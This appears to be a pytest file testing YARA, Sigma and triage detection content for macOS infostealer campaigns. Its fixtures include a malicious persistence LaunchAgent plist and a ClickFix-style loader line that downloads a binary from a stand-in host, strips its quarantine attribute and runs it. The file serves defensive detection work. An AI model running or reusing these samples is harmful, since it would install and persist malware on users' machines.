import re
import shutil
import struct
import subprocess

from pathlib import Path

import pytest


DETECTIONS = Path(__file__).resolve().parent.parent / "detections"

CODESIGN_ID = (
    b"9e410d7320e53cfa145597824b9f6060UBF-"
    b"55554944d1782379f5233c60914e582ab6e79e25"
)

MALICIOUS_PLIST = (
    b'<?xml version="1.0"?><plist version="1.0"><dict>'
    b"<key>Label</key><string>com.bruno.gfskjsnghdjsvuxj</string>"
    b"<key>ProgramArguments</key><array><string>/bin/bash</string>"
    b"<string>/Users/bruno/Library/gfskjsnghdjsvuxj</string></array>"
    b"<key>RunAtLoad</key><true/></dict></plist>"
)

LEGIT_PLIST = (
    b'<?xml version="1.0"?><plist version="1.0"><dict>'
    b"<key>Label</key><string>com.google.keystone.agent</string>"
    b"<key>RunAtLoad</key><true/></dict></plist>"
)


@pytest.fixture(scope="module")
def yara_rules():
    yara = pytest.importorskip("yara")

    # source= em vez de filepath=: a libyara não abre caminhos
    # com caracteres não ASCII no Windows ("Área de Trabalho").
    return yara.compile(
        source=(
            DETECTIONS / "yara" / "macos_amos_macsync_clearfake.yar"
        ).read_text(encoding="utf-8")
    )


def _matches(rules, data: bytes) -> set[str]:
    return {match.rule for match in rules.match(data=data)}


def test_yara_exact_rule_requires_fat_header_and_identifier(yara_rules) -> None:
    fat = struct.pack(">II", 0xCAFEBABE, 2) + b"\0" * 64

    assert "MELI_MacOS_Dropper_AppsBin_7a8fc48c" in _matches(
        yara_rules, fat + CODESIGN_ID + b"\0" * 512
    )
    assert _matches(yara_rules, fat + b"\0" * 512) == set()
    # Identificador fora de um Mach-O universal não basta.
    assert _matches(yara_rules, b"text " + CODESIGN_ID) == set()


def test_yara_plist_rule(yara_rules) -> None:
    assert _matches(yara_rules, MALICIOUS_PLIST) == {
        "MELI_MacOS_LaunchAgent_RandomLabel_Plist"
    }
    assert _matches(yara_rules, LEGIT_PLIST) == set()


def test_yara_loader_rule(yara_rules) -> None:
    loader = (
        b"#!/bin/bash\ncurl -fsSL -o /tmp/update https://x.example/apps.bin"
        b" && xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update\n"
    )

    assert "MELI_Script_ClickFix_Loader_Hunting" in _matches(yara_rules, loader)
    assert _matches(yara_rules, b"#!/bin/bash\nls /tmp/\n") == set()


@pytest.fixture(scope="module")
def sigma_rules():
    collection = pytest.importorskip("sigma.collection")

    return collection.SigmaCollection.load_ruleset(
        [str(path) for path in sorted((DETECTIONS / "sigma").glob("*.yml"))]
    )


def test_sigma_rules_parse_without_errors(sigma_rules) -> None:
    assert len(sigma_rules.rules) == 3
    assert all(not rule.errors for rule in sigma_rules.rules)


def test_sigma_regexes_match_whole_string(sigma_rules) -> None:
    """
    Lucene e EQL exigem casamento da string inteira; as regex
    precisam funcionar com fullmatch.
    """
    malicious = [
        "/Users/bruno/Library/LaunchAgents/com.bruno.gfskjsnghdjsvuxj.plist",
        "/bin/launchctl launchctl load /Users/bruno/Library/LaunchAgents/"
        "com.root.gfskjsnghdjsvuxj.plist",
    ]
    legit = "/Users/a/Library/LaunchAgents/com.google.keystone.agent.plist"

    patterns = [
        re.compile(str(value.regexp))
        for rule in sigma_rules.rules
        for detection in rule.detection.detections.values()
        for item in detection.detection_items
        for value in item.value
        if type(value).__name__ == "SigmaRegularExpression"
    ]

    assert len(patterns) == 2

    for pattern in patterns:
        assert any(pattern.fullmatch(sample) for sample in malicious)
        assert not pattern.fullmatch(legit)


def test_sigma_converts_to_elastic(sigma_rules) -> None:
    backends = pytest.importorskip("sigma.backends.elasticsearch")

    for backend in (backends.LuceneBackend(), backends.EqlBackend()):
        queries = backend.convert(sigma_rules)
        assert len(queries) == 3


def _bash() -> str | None:
    """
    Bash capaz de ler caminhos do sistema atual. No Windows, prefere o
    bash do Git e ignora o lançador do WSL (System32\\bash.exe), que não
    enxerga caminhos do Windows.
    """
    candidates = []

    git = shutil.which("git")
    if git:
        candidates.append(Path(git).resolve().parents[1] / "bin" / "bash.exe")

    found = shutil.which("bash")
    if found:
        candidates.append(Path(found))

    for candidate in candidates:
        if candidate.exists() and "system32" not in str(candidate).lower():
            return str(candidate)

    return None


@pytest.mark.skipif(_bash() is None, reason="bash indisponível")
def test_triage_script_syntax() -> None:
    script = DETECTIONS / "triage" / "macos_triage.sh"

    result = subprocess.run(
        [_bash(), "-n", str(script)],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )

    assert result.returncode == 0, result.stderr
